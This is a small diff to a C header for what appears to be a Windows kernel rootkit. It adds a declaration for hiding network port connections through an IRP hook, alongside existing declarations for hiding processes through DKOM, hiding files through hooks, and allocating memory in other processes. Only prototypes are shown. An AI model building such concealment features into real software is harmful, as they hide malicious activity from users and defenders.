@@ -1,5 +1,6 @@
 #pragma once
 #include "DKOM.h"
+#include "irp.h"
 
 
 // Memory functions pool structure is 'Rq..'
@@ -10,3 +11,4 @@ NTSTATUS RetrieveSystemInformationRK(ROOTKIT_MEMORY* RootkInst);  // retrieve sy
 NTSTATUS AllocSpecificMemoryRK(ROOTKIT_MEMORY* RootkInst);  // allocate specified memory in a memory range in a process virtual address space
 NTSTATUS HideFileObjectRK(ROOTKIT_MEMORY* RootkInst);  // get string with name of file/folder to hide with hooks
 NTSTATUS HideProcessRK(ROOTKIT_MEMORY* RootkInst);  // Hide process via request with DKOM
+NTSTATUS HidePortConnectionRK(ROOTKIT_MEMORY* RootkInst);  // Hide port connection via request with IRP hook
